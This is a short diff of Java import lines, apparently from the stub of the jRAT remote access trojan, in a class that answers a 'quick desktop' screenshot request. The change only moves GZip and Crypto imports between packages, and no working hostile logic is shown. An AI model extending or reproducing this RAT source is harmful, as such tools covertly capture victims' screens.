@@ -7,13 +7,13 @@ import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 
+import pro.jrat.common.compress.GZip;
+import pro.jrat.common.crypto.Crypto;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.Main;
 import pro.jrat.stub.packets.outgoing.Packet68QuickDesktop;
 import pro.jrat.stub.utils.ImageUtils;
 
-import com.redpois0n.common.compress.GZip;
-import com.redpois0n.common.crypto.Crypto;
 
 public class Packet98QuickDesktop extends AbstractIncomingPacket {
 
